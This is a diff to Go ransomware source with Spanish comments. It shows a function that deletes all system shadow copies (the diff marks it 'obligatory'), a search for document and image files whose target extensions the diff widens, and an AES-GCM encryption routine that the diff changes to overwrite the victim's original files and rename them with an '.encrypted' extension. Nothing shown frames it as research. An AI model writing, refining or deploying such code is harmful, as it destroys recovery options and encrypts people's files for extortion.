@@ -85,6 +85,7 @@ func utf16LE(value string) []byte {
 	return encoded
 }
 
+//PARTE OBLIGATORIA
 // deleteShadowCopies elimina todas las copias shadow del sistema
 func deleteShadowCopies() error {
 	fmt.Println("=== Iniciando eliminación de copias shadow ===")
@@ -121,7 +122,7 @@ func searchFiles() ([]string, error) {
 	fmt.Println("=== Iniciando búsqueda de archivos ===")
 	
 	// Extensiones a buscar
-	extensions := []string{".jpg", ".docx", ".xlsx", ".pptx", ".pdf", ".png"}
+	extensions := []string{".jpg",".jpeg", ".gif", ".docx", ".xlsx", ".pptx", ".pdf", ".png"}
 	
 	// Array para almacenar las rutas absolutas encontradas
 	var foundFiles []string
@@ -248,12 +249,15 @@ func encryptFile(filePath string, key []byte) error {
 	
 	// Cifrar los datos
 	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
-	encriptedfilePath := filePath + ".encrypted"
 	
 	// Escribir el archivo cifrado (sobrescribir el original)
-	err = os.WriteFile(encriptedfilePath, ciphertext, 0644)
+	err = os.WriteFile(filePath, ciphertext, 0644)
 	if err != nil {
 		return fmt.Errorf("error al escribir archivo cifrado: %v", err)
+	}
+
+	if err := os.Rename(filePath, filePath+".encrypted"); err != nil {
+		return fmt.Errorf("archivo cifrado, pero no se pudo cambiar extension. %v", err)
 	}
 	
 	return nil
